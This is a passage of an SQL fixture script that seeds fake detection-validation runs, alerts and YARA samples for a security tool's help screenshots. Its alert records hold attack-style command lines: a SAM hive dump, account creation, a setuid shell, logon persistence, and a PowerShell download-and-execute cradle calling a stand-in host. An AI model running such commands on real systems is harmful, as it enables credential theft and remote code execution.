-- tools/help-screenshots: the runs, alerts, samples, validations and YARA QA files the guides'
-- screenshots show, after 1-catalog.sql and the launcher's own calls. Every name, host, address,
-- hash, file and id here is made up; nothing is from a real ACE, a signatures repository or Atomic
-- Red Team. Times are relative to now, so a regenerated page reads the same.
--
-- What ACE computes is left to ACE: the script reviews two runs through the API, which closes their
-- alerts and writes their events, and `ace svs coverage refresh` computes coverage and the worklist.

\set ON_ERROR_STOP on
BEGIN;

-- The signatures of the fixture, as 1-catalog.sql records them.
CREATE TEMP TABLE signatures (uuid text PRIMARY KEY, name text NOT NULL, family text NOT NULL);
INSERT INTO pg_temp.signatures
SELECT svs ->> 'uuid', svs ->> 'name', 'hunt' FROM hunts.hunts WHERE svs IS NOT NULL
UNION ALL
SELECT s ->> 'uuid', s ->> 'name', 'yara'
FROM yara.rulesets r, jsonb_array_elements(r.signatures) s;

-- The helpers below are this session's only.
CREATE FUNCTION pg_temp.person(p_name text) RETURNS jsonb LANGUAGE sql AS $$
    SELECT jsonb_build_object('kind', 'user', 'id', id, 'name', username::text)
    FROM service.users WHERE username = p_name
$$;
CREATE FUNCTION pg_temp.launcher() RETURNS jsonb LANGUAGE sql AS $$
    SELECT jsonb_build_object('kind', 'api_key', 'id', id, 'name', name, 'owner', NULL)
    FROM service.api_keys WHERE name = 'art-launcher'
$$;
CREATE FUNCTION pg_temp.timers() RETURNS jsonb LANGUAGE sql AS $$
    SELECT '{"kind": "internal", "id": "scheduler:svs_run_timers"}'::jsonb
$$;
CREATE FUNCTION pg_temp.svs() RETURNS jsonb LANGUAGE sql AS $$
    SELECT '{"kind": "internal", "id": "svs"}'::jsonb
$$;
CREATE FUNCTION pg_temp.event(p_run bigint, p_kind text, p_from text, p_to text, p_actor jsonb,
                              p_details jsonb, p_at timestamptz) RETURNS void LANGUAGE sql AS $$
    INSERT INTO svs.run_events (run_id, kind, from_state, to_state, actor, details, created_at)
    VALUES (p_run, p_kind, p_from::svs.run_state, p_to::svs.run_state, p_actor, p_details, p_at)
$$;

-- A run as the launcher and the run timer leave it: registered at `p_at`, started two minutes on,
-- executed a minute after that, and, for one that isn't `created` or `started`, ended when its hour's
-- observation window did. `p_n` makes its uuid and its marker.
CREATE FUNCTION pg_temp.run(p_n integer, p_test text, p_host text, p_batch text, p_at timestamptz,
                            p_state text) RETURNS bigint LANGUAGE plpgsql AS $$
DECLARE
    v_uuid uuid := format('aaaa%s-0000-4000-8000-000000000000', lpad(p_n::text, 4, '0'))::uuid;
    v_id bigint;
    v_started timestamptz := p_at + interval '2 minutes';
    v_test svs.catalog_tests;
    v_host svs.test_hosts;
BEGIN
    SELECT * INTO STRICT v_test FROM svs.catalog_tests WHERE guid = p_test::uuid;
    SELECT * INTO STRICT v_host FROM svs.test_hosts WHERE hostname = p_host;
    INSERT INTO svs.runs
        (uuid, test_guid, platform, test_content_hash, catalog_commit, state, marker, launcher, batch_id,
         extra, registered_by, created_at, started_at, executed_at, exit_code, launcher_output, ended_at,
         observation_seconds, attribution_seconds, observation_ends_at, attribution_ends_at)
    VALUES
        (v_uuid, v_test.guid, v_host.platform, v_test.content_hash, v_test.commit, p_state::svs.run_state,
         'svs-' || substr(translate(encode(sha256(convert_to(v_uuid::text, 'UTF8')), 'hex'), '0189', 'ghij'), 1, 26),
         'art-launcher', p_batch, '{"pipeline": "lab-nightly"}', pg_temp.launcher(), p_at, v_started,
         v_started + interval '1 minute', 0, 'Executing test: ' || v_test.technique || ' ' || v_test.name || E'\nDone executing test',
         CASE WHEN p_state <> 'started' THEN v_started + interval '1 hour' END,
         3600, 90000, v_started + interval '1 hour', v_started + interval '25 hours')
    RETURNING id INTO v_id;
    INSERT INTO svs.run_targets (run_id, hostname, username, host, fqdn, "user", test_host_id)
    VALUES (v_id, p_host, 'art', p_host, v_host.fqdn, 'art', v_host.id);
    PERFORM pg_temp.event(v_id, 'registered', NULL, 'created', pg_temp.launcher(),
        jsonb_build_object('extra', '{"pipeline": "lab-nightly"}'::jsonb,
                           'targets', jsonb_build_array(jsonb_build_object('hostname', p_host, 'username', 'art')),
                           'batch_id', p_batch, 'launcher', 'art-launcher', 'platform', v_host.platform,
                           'test_guid', v_test.guid, 'holds_host', false, 'observation_source', 'all_hunts'),
        p_at);
    PERFORM pg_temp.event(v_id, 'transition', 'created', 'started', pg_temp.launcher(), NULL, v_started);
    PERFORM pg_temp.event(v_id, 'launcher_call', NULL, NULL, pg_temp.launcher(),
        '{"call": "start", "outcome": "started", "payload": {}}', v_started);
    PERFORM pg_temp.event(v_id, 'launcher_call', NULL, NULL, pg_temp.launcher(),
        '{"call": "executed", "outcome": "recorded", "payload": {"error": null, "exit_code": 0, "output_bytes": 61, "output_truncated": false}}',
        v_started + interval '1 minute');
    IF p_state <> 'started' THEN
        PERFORM pg_temp.event(v_id, 'transition', 'started', 'ended', pg_temp.timers(), NULL,
            v_started + interval '1 hour');
    END IF;
    INSERT INTO svs.run_result_state (run_id, generation, computed_generation, stale, computed_at)
    VALUES (v_id, 1, 1, false, v_started + interval '1 hour');
    RETURN v_id;
END
$$;

-- An alert on a host, `p_after` into the run that caused it, with what an analyst would see of it.
CREATE FUNCTION pg_temp.alert(p_n integer, p_title text, p_at timestamptz, p_host text, p_command text)
RETURNS uuid LANGUAGE plpgsql AS $$
DECLARE
    v_uuid uuid := format('a1e47%s-0000-4000-8000-000000000000', lpad(p_n::text, 3, '0'))::uuid;
BEGIN
    INSERT INTO analysis.roots
        (id, analysis_mode, description, event_time, event_time_source, created_at, alerted_at, pass,
         completed_pass, submitted_by, origin)
    VALUES (v_uuid, 'correlation', p_title, p_at - interval '40 seconds', 'event', p_at, p_at, 1, 1,
            '{"kind": "internal", "id": "hunter"}',
            '{"tool": "hunter", "alert_type": "hunter - splunk - endpoint"}');
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_uuid, 'hostname', p_host, p_at), (v_uuid, 'user', 'art', p_at),
           (v_uuid, 'command_line', p_command, p_at);
    RETURN v_uuid;
END
$$;

-- A detection of a signature on an alert, and its id.
CREATE FUNCTION pg_temp.detection(p_alert uuid, p_signature text, p_at timestamptz)
RETURNS bigint LANGUAGE sql AS $$
    INSERT INTO analysis.detections
        (root_id, observable_id, description, signature_uuid, signature_version, signature_family, created_at)
    SELECT p_alert, (SELECT min(id) FROM analysis.observables WHERE root_id = p_alert AND type = 'command_line'),
           s.name || ' matched', p_signature, 'feedface00feedface00feedface00feedface00', s.family, p_at
    FROM pg_temp.signatures s WHERE s.uuid = p_signature
    RETURNING id
$$;

-- An attribution of a detection to a run, with the event the core's hook writes for it.
CREATE FUNCTION pg_temp.attribute(p_run bigint, p_alert uuid, p_detection bigint, p_confidence text,
                                  p_at timestamptz) RETURNS void LANGUAGE plpgsql AS $$
BEGIN
    INSERT INTO svs.attributions
        (run_id, root_id, detection_id, confidence, event_time, event_time_source, source, scan_point,
         actor, created_at)
    VALUES (p_run, p_alert, p_detection, p_confidence::svs.attribution_confidence,
            p_at - interval '40 seconds', 'event', 'router',
            CASE WHEN p_confidence = 'marker' THEN 'observable' END, pg_temp.svs(), p_at);
    PERFORM pg_temp.event(p_run, 'attributed', NULL, NULL, pg_temp.svs(),
        jsonb_build_object('alert_uuid', p_alert, 'detections', jsonb_build_array(jsonb_build_object(
            'detection', p_detection, 'confidence', p_confidence, 'late', false,
            'scan_point', CASE WHEN p_confidence = 'marker' THEN 'observable' END))),
        p_at);
END
$$;

-- A row of a run's result.
CREATE FUNCTION pg_temp.result(p_run bigint, p_signature text, p_status text, p_alerts integer,
                               p_reviewed text, p_context boolean DEFAULT false) RETURNS void LANGUAGE sql AS $$
    INSERT INTO svs.run_results
        (run_id, signature_uuid, signature_family, signature_name, status, alert_count, context_only,
         content_hash, reviewed_status, reviewed_alert_count, reviewed_late_only, reviewed_content_hash)
    SELECT p_run, s.uuid, s.family, s.name, p_status, p_alerts, p_context,
           encode(sha256(convert_to(s.name, 'UTF8')), 'hex'), p_reviewed,
           CASE WHEN p_reviewed IS NOT NULL THEN p_alerts END,
           CASE WHEN p_reviewed IS NOT NULL THEN false END,
           CASE WHEN p_reviewed IS NOT NULL THEN encode(sha256(convert_to(s.name, 'UTF8')), 'hex') END
    FROM pg_temp.signatures s WHERE s.uuid = p_signature
$$;

-- A run reviewed before today, as a review leaves it: owned and reviewed by `p_by`, its alerts closed.
CREATE FUNCTION pg_temp.reviewed(p_run bigint, p_by text, p_at timestamptz) RETURNS void LANGUAGE plpgsql AS $$
DECLARE
    v_alerts uuid[];
BEGIN
    UPDATE svs.runs
    SET state = 'reviewed', reviewed_at = p_at,
        reviewer_id = (SELECT id FROM service.users WHERE username = p_by),
        owner_id = (SELECT id FROM service.users WHERE username = p_by)
    WHERE id = p_run;
    PERFORM pg_temp.event(p_run, 'ownership_taken', NULL, NULL, pg_temp.person(p_by), '{"from": null}', p_at);
    PERFORM pg_temp.event(p_run, 'reviewed', 'ended', 'reviewed', pg_temp.person(p_by),
        (SELECT jsonb_build_object('re_review', false, 'counts', COALESCE(jsonb_object_agg(status, n), '{}'))
         FROM (SELECT status, count(*) AS n FROM svs.run_results WHERE run_id = p_run GROUP BY status) c),
        p_at);
    SELECT array_agg(DISTINCT root_id) INTO v_alerts FROM svs.attributions WHERE run_id = p_run;
    IF v_alerts IS NOT NULL THEN
        UPDATE analysis.roots
        SET disposition = 'SIMULATED', dispositioned_at = p_at, dispositioned_by = pg_temp.person(p_by)
        WHERE id = ANY (v_alerts);
        PERFORM pg_temp.event(p_run, 'alerts_closed', NULL, NULL, pg_temp.person(p_by),
            jsonb_build_object('alerts', to_jsonb(v_alerts), 'disposition', 'SIMULATED', 'late', false,
                               'reviewed', true),
            p_at);
    END IF;
END
$$;

-- Fully attributed alerts go to the test queue, as the router sends them.
CREATE FUNCTION pg_temp.to_test_queue(p_alert uuid) RETURNS void LANGUAGE sql AS $$
    UPDATE analysis.roots SET queue = 'svs', tags = '{svs_test}' WHERE id = p_alert
$$;

DO $$
DECLARE
    kerb constant text := '5160a000-0000-4000-8000-000000000001';
    cradle constant text := '5160a000-0000-4000-8000-000000000002';
    enc constant text := '5160a000-0000-4000-8000-000000000003';
    sam constant text := '5160a000-0000-4000-8000-000000000004';
    net constant text := '7a1d0000-5e5f-4c11-9000-000000000005';
    task constant text := '5160a000-0000-4000-8000-000000000006';
    suid constant text := '5160a000-0000-4000-8000-000000000008';
    winrm constant text := '5160a000-0000-4000-8000-000000000009';
    t_kerb constant text := '7e570001-0000-4000-8000-000000000001';
    t_sam constant text := '7e570001-0000-4000-8000-000000000002';
    t_net constant text := '7e570001-0000-4000-8000-000000000004';
    t_task constant text := '7e570001-0000-4000-8000-000000000005';
    t_cert constant text := '7e570001-0000-4000-8000-000000000006';
    t_suid constant text := '7e570001-0000-4000-8000-000000000007';
    t_plist constant text := '7e570001-0000-4000-8000-000000000008';
    t_cron constant text := '7e570001-0000-4000-8000-00000000000a';
    -- two nights ago and last night
    n1 timestamptz := date_trunc('hour', now()) - interval '50 hours';
    n2 timestamptz := date_trunc('hour', now()) - interval '26 hours';
    b1 text := 'nightly-' || to_char(now() - interval '2 days', 'YYYY-MM-DD');
    b2 text := 'nightly-' || to_char(now() - interval '1 day', 'YYYY-MM-DD');
    r bigint;
    a uuid;
    d bigint;
    at timestamptz;
BEGIN
    -- ---- two nights ago: the first runs of five tests, each reviewed the next morning ----

    -- the SAM hive: its rule fired, and alice expected it
    r := pg_temp.run(1, t_sam, 'win10-art-01', b1, n1, 'ended');
    at := n1 + interval '9 minutes';
    a := pg_temp.alert(1, 'CA_Registry_SAM_Save: reg.exe saved the SAM hive on win10-art-01', at, 'win10-art-01',
                       'reg save HKLM\SAM C:\Users\art\AppData\Local\Temp\sam-art_marker.save');
    d := pg_temp.detection(a, sam, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    PERFORM pg_temp.to_test_queue(a);
    PERFORM pg_temp.result(r, sam, 'hit', 1, 'hit');
    INSERT INTO svs.expectations (test_guid, platform, signature_uuid, state, signature_family, signature_name,
                                  reason, decided_from_run_id, decided_by, decided_at)
    VALUES (t_sam::uuid, 'windows', sam, 'expected', 'yara', 'CA_Registry_SAM_Save',
            'The rule is written for exactly this command', r, pg_temp.person('alice'), n1 + interval '14 hours');
    PERFORM pg_temp.event(r, 'candidate_decision', NULL, NULL, pg_temp.person('alice'),
        jsonb_build_object('signature_uuid', sam, 'platform', 'windows', 'state', 'expected',
                           'reason', 'The rule is written for exactly this command'), n1 + interval '14 hours');
    PERFORM pg_temp.reviewed(r, 'alice', n1 + interval '14 hours 5 minutes');

    -- the local account: its rule fired too
    r := pg_temp.run(2, t_net, 'win10-art-02', b1, n1 + interval '5 minutes', 'ended');
    at := n1 + interval '12 minutes';
    a := pg_temp.alert(2, 'PE_Net_User_Add: net.exe created a local account on win10-art-02', at, 'win10-art-02',
                       'net user art-art_marker Fixture-Passw0rd! /add');
    d := pg_temp.detection(a, net, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    PERFORM pg_temp.to_test_queue(a);
    PERFORM pg_temp.result(r, net, 'hit', 1, 'hit');
    INSERT INTO svs.expectations (test_guid, platform, signature_uuid, state, signature_family, signature_name,
                                  reason, decided_from_run_id, decided_by, decided_at)
    VALUES (t_net::uuid, 'windows', net, 'expected', 'yara', 'PE_Net_User_Add', NULL, r,
            pg_temp.person('alice'), n1 + interval '14 hours 10 minutes');
    PERFORM pg_temp.reviewed(r, 'alice', n1 + interval '14 hours 12 minutes');

    -- the setuid shell on Linux, which bob reviews
    r := pg_temp.run(3, t_suid, 'ubuntu-art-01', b1, n1 + interval '10 minutes', 'ended');
    at := n1 + interval '31 minutes';
    a := pg_temp.alert(3, 'LX_Chmod_Setuid_Shell: setuid bit set on a copy of sh on ubuntu-art-01', at, 'ubuntu-art-01',
                       'chmod u+s /tmp/sh-art_marker');
    d := pg_temp.detection(a, suid, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    PERFORM pg_temp.to_test_queue(a);
    PERFORM pg_temp.result(r, suid, 'hit', 1, 'hit');
    INSERT INTO svs.expectations (test_guid, platform, signature_uuid, state, signature_family, signature_name,
                                  reason, decided_from_run_id, decided_by, decided_at)
    VALUES (t_suid::uuid, 'linux', suid, 'expected', 'hunt', 'LX_Chmod_Setuid_Shell', NULL, r,
            pg_temp.person('bob'), n1 + interval '15 hours');
    PERFORM pg_temp.reviewed(r, 'bob', n1 + interval '15 hours 2 minutes');

    -- the cron job: nothing fired, and nothing is expected of it
    r := pg_temp.run(4, t_cron, 'ubuntu-art-01', b1, n1 + interval '80 minutes', 'ended');
    PERFORM pg_temp.reviewed(r, 'bob', n1 + interval '15 hours 6 minutes');

    -- the scheduled task: its hunt fired, and so did the launcher's own remoting, ignored for every test
    r := pg_temp.run(5, t_task, 'win10-art-03', b1, n1 + interval '15 minutes', 'ended');
    at := n1 + interval '33 minutes';
    a := pg_temp.alert(5, 'CA_Schtasks_Logon_Task: a task that runs at logon was created on win10-art-03', at,
                       'win10-art-03', 'schtasks /create /tn art-art_marker /tr C:\Users\art\AppData\Local\Temp\art.cmd /sc onlogon');
    d := pg_temp.detection(a, task, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    d := pg_temp.detection(a, winrm, at);
    PERFORM pg_temp.attribute(r, a, d, 'context', at + interval '20 seconds');
    UPDATE svs.attributions SET kept_at = n1 + interval '14 hours 20 minutes', kept_by = pg_temp.person('alice')
    WHERE detection_id = d;
    PERFORM pg_temp.to_test_queue(a);
    PERFORM pg_temp.result(r, task, 'hit', 1, 'hit');
    PERFORM pg_temp.result(r, winrm, 'ignored', 1, 'ignored', true);
    INSERT INTO svs.expectations (test_guid, platform, signature_uuid, state, signature_family, signature_name,
                                  reason, decided_from_run_id, decided_by, decided_at)
    VALUES (t_task::uuid, 'windows', task, 'expected', 'hunt', 'CA_Schtasks_Logon_Task',
            'Creating the task is what the test does', r, pg_temp.person('alice'), n1 + interval '14 hours 22 minutes');
    INSERT INTO svs.ignores (test_guid, signature_uuid, signature_family, signature_name, reason, created_by, created_at)
    VALUES (NULL, winrm, 'hunt', 'EX_WinRM_Remote_Shell', 'The launcher reaches every test host over WinRM',
            pg_temp.person('alice'), n1 + interval '14 hours 21 minutes');
    PERFORM pg_temp.reviewed(r, 'alice', n1 + interval '14 hours 25 minutes');

    -- ---- last night ----

    -- the SAM hive again: ended, its expected rule a hit, waiting for the review the script gives it
    r := pg_temp.run(6, t_sam, 'win10-art-01', b2, n2, 'ended');
    at := n2 + interval '8 minutes';
    a := pg_temp.alert(6, 'CA_Registry_SAM_Save: reg.exe saved the SAM hive on win10-art-01', at, 'win10-art-01',
                       'reg save HKLM\SAM C:\Users\art\AppData\Local\Temp\sam-art_marker.save');
    d := pg_temp.detection(a, sam, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    PERFORM pg_temp.to_test_queue(a);
    PERFORM pg_temp.result(r, sam, 'hit', 1, NULL);

    -- the local account again: the expected rule didn't fire; the script reviews it too
    r := pg_temp.run(7, t_net, 'win10-art-02', b2, n2 + interval '5 minutes', 'ended');
    PERFORM pg_temp.result(r, net, 'missing', 0, NULL);
    INSERT INTO svs.run_comments (run_id, user_id, comment, created_at, updated_at)
    SELECT r, id, E'The test ran: exit code 0, and the account exists on the host.\nThe file the rule scans never reached ACE: the collector on win10-art-02 stopped forwarding at 01:40. Ticket LAB-311.',
           n2 + interval '13 hours', n2 + interval '13 hours'
    FROM service.users WHERE username = 'bob';

    -- Kerberoasting, the guides' walk-through: ended, with two candidates and an alert held by context
    r := pg_temp.run(8, t_kerb, 'win10-art-03', b2, n2 + interval '10 minutes', 'ended');
    at := n2 + interval '24 minutes';
    a := pg_temp.alert(81, 'CA_PowerShell_Invoke_Kerberoast: service tickets requested for many accounts on win10-art-03',
                       at, 'win10-art-03', 'powershell.exe Invoke-FixtureKerberoast -Domain lab.example.com -Marker art_marker');
    d := pg_temp.detection(a, kerb, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    d := pg_temp.detection(a, cradle, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    PERFORM pg_temp.to_test_queue(a);
    -- the same host and time, but no marker: someone has to say whether it is the test
    at := n2 + interval '27 minutes';
    a := pg_temp.alert(82, 'EX_PowerShell_Download_Cradle: PowerShell downloaded and ran a script on win10-art-03',
                       at, 'win10-art-03', 'powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString(''http://files.lab.example.com/tools.ps1'')"');
    d := pg_temp.detection(a, cradle, at);
    PERFORM pg_temp.attribute(r, a, d, 'context', at + interval '20 seconds');
    PERFORM pg_temp.to_test_queue(a);
    -- one detection is the run's and one isn't: the alert stays with analysts
    at := n2 + interval '29 minutes';
    a := pg_temp.alert(83, 'EX_PowerShell_Encoded_Command: encoded PowerShell on win10-art-03',
                       at, 'win10-art-03', 'powershell.exe -EncodedCommand SQBFAFgAIAAoAEYAaQB4AHQAdQByAGUAKQA=');
    d := pg_temp.detection(a, kerb, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    d := pg_temp.detection(a, enc, at);
    PERFORM pg_temp.result(r, kerb, 'candidate', 2, NULL);
    PERFORM pg_temp.result(r, cradle, 'candidate', 2, NULL);
    PERFORM pg_temp.event(r, 'result_computed', NULL, NULL, pg_temp.timers(),
        '{"counts": {"candidate": 2}, "previous": {}}', n2 + interval '72 minutes');

    -- the download: the launcher reported a failure, and bob took the run
    r := pg_temp.run(9, t_cert, 'win10-art-01', b2, n2 + interval '70 minutes', 'ended');
    UPDATE svs.runs
    SET state = 'error', ended_at = NULL, exit_code = 1, launcher_output = NULL,
        launcher_error = E'certutil: -URLCache command FAILED: 0x80190197 (HTTP 407 Proxy Authentication Required)\nCertUtil: The proxy requires authentication. The test''s file was not downloaded.',
        error_reason = 'the launcher reported exit code 1',
        owner_id = (SELECT id FROM service.users WHERE username = 'bob')
    WHERE id = r;
    DELETE FROM svs.run_events WHERE run_id = r AND kind = 'transition' AND to_state = 'ended';
    DELETE FROM svs.run_result_state WHERE run_id = r;
    PERFORM pg_temp.event(r, 'transition', 'started', 'error', pg_temp.launcher(),
        '{"reason": "the launcher reported exit code 1"}', n2 + interval '73 minutes 10 seconds');
    PERFORM pg_temp.event(r, 'ownership_taken', NULL, NULL, pg_temp.person('bob'), '{"from": null}',
        n2 + interval '12 hours');
    INSERT INTO svs.run_comments (run_id, user_id, comment, created_at, updated_at)
    SELECT r, id, 'The lab proxy blocked the download: files.lab.example.com is missing from its allow list since the change on Tuesday. Asked the network team to put it back; rerun after.',
           n2 + interval '12 hours 4 minutes', n2 + interval '12 hours 4 minutes'
    FROM service.users WHERE username = 'bob';

    -- the setuid shell again, reviewed by bob
    r := pg_temp.run(10, t_suid, 'ubuntu-art-01', b2, n2 + interval '15 minutes', 'ended');
    at := n2 + interval '36 minutes';
    a := pg_temp.alert(10, 'LX_Chmod_Setuid_Shell: setuid bit set on a copy of sh on ubuntu-art-01', at, 'ubuntu-art-01',
                       'chmod u+s /tmp/sh-art_marker');
    d := pg_temp.detection(a, suid, at);
    PERFORM pg_temp.attribute(r, a, d, 'marker', at + interval '20 seconds');
    PERFORM pg_temp.to_test_queue(a);
    PERFORM pg_temp.result(r, suid, 'hit', 1, 'hit');
    PERFORM pg_temp.reviewed(r, 'bob', n2 + interval '11 hours');

    -- the scheduled task again: the host was rebuilt under it, so alice closed it
    r := pg_temp.run(11, t_task, 'win10-art-03', b2, n2 + interval '90 minutes', 'ended');
    PERFORM pg_temp.result(r, task, 'missing', 0, NULL);
    UPDATE svs.runs
    SET state = 'closed', closed_at = n2 + interval '13 hours 30 minutes',
        close_reason = 'win10-art-03 was rebuilt during the window, so nothing can be learned from it',
        owner_id = (SELECT id FROM service.users WHERE username = 'alice')
    WHERE id = r;
    PERFORM pg_temp.event(r, 'ownership_taken', NULL, NULL, pg_temp.person('alice'), '{"from": null}',
        n2 + interval '13 hours 29 minutes');
    PERFORM pg_temp.event(r, 'transition', 'ended', 'closed', pg_temp.person('alice'),
        '{"reason": "win10-art-03 was rebuilt during the window, so nothing can be learned from it"}',
        n2 + interval '13 hours 30 minutes');

    -- the launch agent: canceled by the launcher before it started
    r := pg_temp.run(12, t_plist, 'mac-art-01', b2, n2 + interval '20 minutes', 'ended');
    UPDATE svs.runs
    SET state = 'closed', started_at = NULL, executed_at = NULL, exit_code = NULL, launcher_output = NULL,
        ended_at = NULL, observation_ends_at = NULL, attribution_ends_at = NULL,
        canceled_at = n2 + interval '21 minutes', closed_at = n2 + interval '21 minutes',
        close_reason = 'canceled before it started'
    WHERE id = r;
    DELETE FROM svs.run_events WHERE run_id = r AND kind <> 'registered';
    DELETE FROM svs.run_result_state WHERE run_id = r;
    PERFORM pg_temp.event(r, 'launcher_call', NULL, NULL, pg_temp.launcher(),
        '{"call": "cancel", "outcome": "canceled", "payload": {"reason": "mac-art-01 did not answer"}}',
        n2 + interval '21 minutes');
    PERFORM pg_temp.event(r, 'transition', 'created', 'closed', pg_temp.launcher(),
        '{"reason": "canceled before it started"}', n2 + interval '21 minutes');
END
$$;

-- The launcher's run of today, which it started a few minutes ago: one alert so far.
DO $$
DECLARE
    r bigint;
    a uuid;
    d bigint;
BEGIN
    SELECT id INTO STRICT r FROM svs.runs WHERE state = 'started';
    a := pg_temp.alert(121, 'EX_PowerShell_Encoded_Command: encoded PowerShell on win10-art-02',
                       now() - interval '2 minutes', 'win10-art-02',
                       'powershell.exe -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAbQBhAHIAawBlAHIA');
    d := pg_temp.detection(a, '5160a000-0000-4000-8000-000000000003', now() - interval '2 minutes');
    PERFORM pg_temp.attribute(r, a, d, 'marker', now() - interval '100 seconds');
    PERFORM pg_temp.to_test_queue(a);
    -- it has been running a while
    UPDATE svs.runs
    SET created_at = created_at - interval '21 minutes', started_at = started_at - interval '20 minutes',
        executed_at = executed_at - interval '19 minutes',
        observation_ends_at = observation_ends_at - interval '20 minutes',
        attribution_ends_at = attribution_ends_at - interval '20 minutes'
    WHERE id = r;
END
$$;

-- A marker where it doesn't belong: the started run's marker in an alert from a workstation that isn't
-- a test host. The core's hook tags the alert and adds a detection that says so.
DO $$
DECLARE
    a uuid;
    v_marker text;
BEGIN
    SELECT marker INTO STRICT v_marker FROM svs.runs WHERE state = 'started';
    a := pg_temp.alert(900, 'EX_PowerShell_Encoded_Command: encoded PowerShell on fin-ws-042',
                       now() - interval '6 minutes', 'fin-ws-042.corp.example.com',
                       'powershell.exe -EncodedCommand UwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAbQBhAHIAawBlAHIA # art_' || v_marker);
    PERFORM pg_temp.detection(a, '5160a000-0000-4000-8000-000000000003', now() - interval '6 minutes');
    -- ace_core::svs's MARKER_MISMATCH_SIGNATURE, and the detection as its hook writes it
    INSERT INTO analysis.detections (root_id, description, details, signature_uuid, signature_family, created_at)
    VALUES (a, 'SVS test run marker ' || v_marker || ' does not match its run: other host',
            jsonb_build_object('marker', v_marker, 'result', 'other host'),
            '9b90e9be-67e7-402c-b4f6-e7be758ee260', 'builtin', now() - interval '5 minutes');
    UPDATE analysis.roots SET tags = '{svs:marker_mismatch}' WHERE id = a;
END
$$;

-- The event log is read in the order it was written: write each run's events again, oldest first.
CREATE TEMP TABLE events AS SELECT * FROM svs.run_events;
DELETE FROM svs.run_events;
INSERT INTO svs.run_events (run_id, kind, from_state, to_state, actor, details, created_at)
SELECT run_id, kind, from_state, to_state, actor, details, created_at
FROM pg_temp.events ORDER BY created_at, id;

-- The alert the refused registration raised: no pool runs in this stack, so say its one pass is done,
-- as it would be a moment after it was raised.
UPDATE analysis.roots SET completed_pass = pass WHERE origin ->> 'tool' = 'svs';

-- ---- samples: files YARA rules matched on graded alerts ----

CREATE FUNCTION pg_temp.capture(p_n integer, p_title text, p_ago interval, p_disposition text, p_file text,
                                p_seed text, p_rules text[], p_size bigint) RETURNS void LANGUAGE plpgsql AS $$
DECLARE
    v_root uuid := format('5a3b1e%s-0000-4000-8000-000000000000', lpad(p_n::text, 2, '0'))::uuid;
    v_sha text := encode(sha256(convert_to(p_seed, 'UTF8')), 'hex');
    v_at timestamptz := now() - p_ago;
    v_observable bigint;
    v_rule text;
BEGIN
    INSERT INTO analysis.roots
        (id, analysis_mode, description, event_time_source, created_at, alerted_at, pass, completed_pass,
         disposition, dispositioned_at, dispositioned_by, submitted_by)
    VALUES (v_root, 'correlation', p_title, 'unset', v_at, v_at, 1, 1, p_disposition, v_at + interval '3 hours',
            pg_temp.person('alice'), '{"kind": "internal", "id": "hunter"}');
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_root, 'file', v_sha, v_at) RETURNING id INTO v_observable;
    FOREACH v_rule IN ARRAY p_rules LOOP
        INSERT INTO analysis.detections
            (root_id, observable_id, description, signature_uuid, signature_version, signature_family, created_at)
        SELECT v_root, v_observable, s.name || ' matched ' || p_file, s.uuid,
               'feedface00feedface00feedface00feedface00', 'yara', v_at
        FROM pg_temp.signatures s WHERE s.uuid = v_rule;
        INSERT INTO svs.yara_captures
            (root_id, observable_id, sha256, rule_uuid, rule_name, namespace, signature_version,
             rule_content_hash, file_path, file_size, state, record, match_summary, yara_version, created_at,
             stored_at)
        SELECT v_root, v_observable, v_sha, s.uuid, s.name, 'detection_rules',
               'feedface00feedface00feedface00feedface00', encode(sha256(convert_to(s.name, 'UTF8')), 'hex'),
               p_file, p_size, 'stored',
               jsonb_build_object('rule', s.name, 'namespace', 'detection_rules',
                                  'strings', jsonb_build_array(jsonb_build_object('identifier', '$a', 'offset', 112, 'length', 14))),
               jsonb_build_object('strings', 1), '1.22.1', v_at, v_at + interval '5 seconds'
        FROM pg_temp.signatures s WHERE s.uuid = v_rule;
    END LOOP;
    INSERT INTO store.objects (pool, sha256, size, mime_type)
    VALUES ('svs_samples', v_sha, p_size, 'application/octet-stream')
    ON CONFLICT DO NOTHING;
END
$$;

DO $$
DECLARE
    enc constant text := '5160a000-0000-4000-8000-000000000003';
    sam constant text := '5160a000-0000-4000-8000-000000000004';
    net constant text := '7a1d0000-5e5f-4c11-9000-000000000005';
BEGIN
    -- the same script graded both ways: conflicted
    PERFORM pg_temp.capture(1, 'EX_PowerShell_Encoded_Command: encoded PowerShell on it-admin-07', '9 days',
                            'FALSE_POSITIVE', 'deploy_agent.ps1', 'deploy_agent.ps1', ARRAY[enc], 4812);
    PERFORM pg_temp.capture(2, 'EX_PowerShell_Encoded_Command: encoded PowerShell on hr-ws-113', '4 days',
                            'EXPLOITATION', 'deploy_agent.ps1', 'deploy_agent.ps1', ARRAY[enc], 4812);
    -- plain ones
    PERFORM pg_temp.capture(3, 'EX_PowerShell_Encoded_Command: encoded PowerShell on dev-ws-021', '12 days',
                            'FALSE_POSITIVE', 'build_helpers.ps1', 'build_helpers.ps1', ARRAY[enc], 2210);
    PERFORM pg_temp.capture(4, 'EX_PowerShell_Encoded_Command: encoded PowerShell on sales-ws-064', '6 days',
                            'DELIVERY', 'invoice_viewer.ps1', 'invoice_viewer.ps1', ARRAY[enc], 9730);
    PERFORM pg_temp.capture(5, 'CA_Registry_SAM_Save: SAM hive saved on srv-file-02', '15 days',
                            'EXPLOITATION', 'sam.save', 'sam.save one', ARRAY[sam], 65536);
    PERFORM pg_temp.capture(6, 'CA_Registry_SAM_Save: SAM hive saved on srv-app-11', '3 days',
                            'EXPLOITATION', 'sam.save', 'sam.save one', ARRAY[sam], 65536);
    -- two rules on one alert: each label is inherited from an alert where several fired
